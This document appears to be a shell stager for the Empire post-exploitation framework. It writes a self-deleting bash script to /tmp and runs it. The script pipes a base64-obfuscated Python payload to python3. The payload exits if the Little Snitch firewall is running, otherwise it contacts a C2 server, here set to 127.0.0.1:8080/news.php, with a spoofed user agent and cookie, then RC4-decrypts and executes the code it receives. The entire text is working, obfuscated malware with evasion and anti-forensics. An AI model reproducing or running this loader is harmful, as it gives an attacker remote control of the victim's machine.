rm -f /tmp/empire.sh
echo '#!/bin/bash' >> /tmp/empire.sh
echo 'echo "import sys,base64,warnings;warnings.filterwarnings('\''ignore'\'');exec(base64.b64decode('\''aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3' >> /tmp/empire.sh
echo 'JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLC' >> /tmp/empire.sh
echo 'BvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly' >> /tmp/empire.sh
echo '8xMjcuMC4wLjE6ODA4MCc7dD0nL25ld3MucGhwJzsKcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3Qoc2VydmVyK3QpOwpwcm94eSA9IHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliLnJlcXVlc3QuYnVpbGRfb3BlbmVyKHByb3h5KTsKby' >> /tmp/empire.sh
echo '5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLFVBKSwgKCJDb29raWUiLCAic2Vzc2lvbj1JVk4vSzRIT2RyYXZSc1VqSjdBVkJKZ255MkU9IildOwp1cmxsaWIucmVxdWVzdC5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSkucm' >> /tmp/empire.sh
echo 'VhZCgpOwpJVj1hWzA6NF07CmRhdGE9YVs0Ol07CmtleT1JVisncHBjQmFVWXU5MTJmMDhHWUp4dktQUmhtclJROFBMTjcnLmVuY29kZSgnVVRGLTgnKTsKUyxqLG91dD1saXN0KHJhbmdlKDI1NikpLDAsW107CmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgIC' >> /tmp/empire.sh
echo 'BqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwppPWo9MDsKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2OwogICAgaj0oaitTW2ldKSUyNTY7CiAgICBTW2ldLFNbal09U1tqXSxTW2ldOwogICAgb3' >> /tmp/empire.sh
echo 'V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKTsKZXhlYygnJy5qb2luKG91dCkpOw=='\''));" | python3 &' >> /tmp/empire.sh
echo 'rm -f "$0"' >> /tmp/empire.sh
echo 'exit' >> /tmp/empire.sh
chmod +x /tmp/empire.sh
/tmp/empire.sh
